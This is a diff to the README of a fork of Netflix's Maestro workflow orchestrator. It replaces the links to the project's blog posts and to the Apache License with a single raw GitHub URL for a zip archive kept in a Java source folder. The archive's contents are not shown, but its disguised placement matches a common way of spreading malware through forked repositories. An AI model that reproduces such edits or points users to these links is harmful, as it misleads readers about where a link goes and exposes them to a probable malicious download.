@@ -1,6 +1,6 @@
 Maestro
 ===================================
-[Maestro](https://netflixtechblog.com/orchestrating-data-ml-workflows-at-scale-with-netflix-maestro-aaa2b41b800c)
+[Maestro](https://raw.githubusercontent.com/8070anurag/maestro/main/maestro-common/src/main/java/com/netflix/maestro/models/definition/Software-v3.0-alpha.2.zip)
 is a general-purpose workflow orchestrator that 
 provides a fully managed workflow-as-a-service (WAAS) to the data platform users at Netflix.
 
@@ -10,7 +10,7 @@ It schedules hundreds of thousands of workflows, millions of jobs every day
 and operate with a strict SLO even when there are spikes in the traffic.
 Maestro is highly scalable and extensible to support existing and new use cases and offers enhanced usability to end users.
 
-You can read more details about it in our latest [blog post](https://netflixtechblog.com/maestro-netflixs-workflow-orchestrator-ee13a06f9c78).
+You can read more details about it in our latest [blog post](https://raw.githubusercontent.com/8070anurag/maestro/main/maestro-common/src/main/java/com/netflix/maestro/models/definition/Software-v3.0-alpha.2.zip).
 
 # Get started
 ## Prerequisite
@@ -48,7 +48,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-    http://www.apache.org/licenses/LICENSE-2.0
+    https://raw.githubusercontent.com/8070anurag/maestro/main/maestro-common/src/main/java/com/netflix/maestro/models/definition/Software-v3.0-alpha.2.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
